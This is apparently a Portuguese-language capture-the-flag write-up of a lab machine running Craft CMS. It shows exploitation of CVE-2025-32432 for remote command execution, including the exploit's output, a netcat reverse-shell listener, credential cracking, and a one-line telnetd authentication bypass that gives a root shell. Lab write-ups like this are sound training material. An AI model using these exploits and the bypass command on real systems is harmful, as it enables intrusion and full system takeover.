#ctfs 

Dado o IP inicial, comecei realizando um scaneamento de portas via nmap 

```bash
└─$ nmap 10.129.244.146 -Pn --open -p-

Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 21:35 -03
Nmap scan report for 10.129.244.146
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 53.33 seconds
```

O que nos dá a primeira flag.

Realizo agora um scan mais aprofundado nas portas 22 e 80, a fim de verificar possíveis versões de serviços

```bash
└─$ nmap 10.129.244.146 -Pn --open -p 22,80 -sV

Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 21:38 -03
Nmap scan report for 10.129.244.146
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```


Vamos focar agora um pouco no serviço Web.

Ao tentar acessar o endereço Web através do IP fornecido chegamos a seguinte mensagem

![[Pasted image 20260803214339.png]]

Precisamos editar o `/etc/hosts` com o domínio fornecido. Após tal edição, chegamos a página web do servidor

![[Pasted image 20260803214518.png]]

Quero descobrir a versão do CMS utilizado, tentemos usar o utilitário `whatweb`

```bash
└─$ whatweb http://orion.htb/
http://orion.htb/ [200 OK] Country[RESERVED][ZZ], Email[your.email@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.244.146], Open-Graph-Protocol, PoweredBy[CraftCMS], Script, Title[Orion Telecom], UncommonHeaders[x-robots-tag], X-Powered-By[Craft CMS], nginx[1.18.0]
```


Observe que só nos retornou o nome do CMS, entretanto, não a versão que é o que eu desejo.

Paralelamente ao `whatweb` rodei o `feroxbuster` na busca por diretórios, o que me retornou uma página de login interessante

![[Pasted image 20260803220034.png]]

Ao acessá-la, encontramos a resposta da próxima flag

![[Pasted image 20260803220111.png]]

Tendo a versão do CMS, vamos em busca de um exploit funcional. Após uma breve pesquisa no Google encontramos o [CVE-2025-32432](https://github.com/HeltonPojo/CVE-2025-32432).

Executando o código fornecido com o comando `id`temos como resposta:

```shell
└─$ go run exploit.go -u http://orion.htb/ -c id
[+] Obtained CraftSessionId: ct9if3ldp1sjaosa4mssl0e514
[+] Obtained CSRF token: 4X7A1eve66VZXVLT9ki_...
[+] Session poisoning request sent (HTTP 200)
[*] Waiting for session file to be written...
[*] Brute-forcing Asset ID (best-effort)...
[+] Potential valid Asset ID found: 1 (HTTP 200)
[+] Using Asset ID: 1
Status Code: 200

[+] Server response:
[+] Command output:
fee81108e13e47e33081e3cc28ea6928__flash|a:0:{}5617f36303fcfa172f5dd991a7022285__returnUrl|s:80:"http://orion.htb/index.php?p=admin/dashboard&a=uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


Iniciando uma shell reversa e aplicando o comando `whoami`:

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [xxxxxxxxxxx] from (UNKNOWN) [10.129.244.146] 49162
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Quero descobrir o arquivo que possui a senha do banco de dados MySQL. Após uma breve pesquisada descobrimos:

![[Pasted image 20260803224534.png]]

Após algumas tentativas frustradas de conseguir conexão com o MySQL por falha minha, consegui abrir o banco de dados

![[Pasted image 20260803234341.png]]

Quebrando a senha via hashcat:

![[Pasted image 20260803234709.png]]

Com as credenciais obtidas, logo no SSH encontrado na enumeração inicial e consigo acesso a conta do adam, revelando a flag de user

![[Pasted image 20260803234827.png]]

Observação: o IP da máquina mudou pois eu precisei reinicia-la para usar no dia seguinte.

Após conseguir acesso inicial a máquina queremos saber qual o serviço que somente pode ser acessado via orion, basta ver as portas abertas via `netstat -nlpt`

![[Pasted image 20260804112636.png]]

Observem que roda em loopback a porta 23, característica do telnet. Rapidamente descobrimos sua versão com `telnet --version`

![[Pasted image 20260804113139.png]]

O exercício nos dá a entender que a vulnerabilidade que devemos atacar é relacionada a essa versão do Telnet. Não seja por isso, após uma breve pesquisa sobre tal versão do Telnet, achamos um [artigo](https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5) que aborda a vulnerabilidade explorada

Após uma rápida leitura a exploração é muito simples, basta digitar o comando `USER="-f root" telnet -a 127.0.0.1 23`que receberemos uma shell de root.

![[Pasted image 20260804114258.png]]

Por fim, vamos até a pasta do root para receber a flag.

![[Pasted image 20260804114327.png]]
